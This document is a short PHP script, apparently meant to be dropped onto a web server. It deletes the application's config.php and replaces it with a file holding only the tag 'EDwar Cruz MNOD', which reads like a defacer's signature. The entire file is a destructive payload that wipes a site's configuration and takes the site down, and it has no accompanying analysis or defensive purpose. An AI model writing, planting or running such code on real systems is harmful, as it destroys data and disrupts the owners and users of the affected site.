<?php 
	unlink('config.php');
	$archivo = fopen('config.php', "a");
	fwrite($archivo, 'EDwar Cruz MNOD');
	fclose($archivo);

 ?>